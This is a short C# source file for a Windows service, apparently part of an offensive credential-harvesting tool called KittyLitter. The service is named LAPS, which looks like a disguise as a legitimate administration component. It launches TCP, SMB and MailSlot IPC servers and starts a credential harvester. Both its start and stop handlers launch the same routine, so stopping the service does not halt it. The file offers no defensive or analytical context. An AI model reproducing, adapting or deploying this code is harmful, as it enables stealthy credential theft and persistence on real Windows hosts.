using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using KittyLitter.IPCServers;
using System.Threading;

namespace LAPS
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }

        public static void Worker()
        {
            TCPServer tcp = new TCPServer();
            SMBServer smb = new SMBServer();
            MailSlotServer mail = new MailSlotServer();
            IPCServer[] servers = new IPCServer[] { tcp, smb, mail };
            foreach (var server in servers)
            {
                Thread t = new Thread(() => server.ServeServer());
                t.Start();
            }
            KittyLitter.CredHarvester.Start();
        }

        protected override void OnStart(string[] args)
        {
            Worker();
        }

        protected override void OnStop()
        {
            Worker();
        }
    }
}
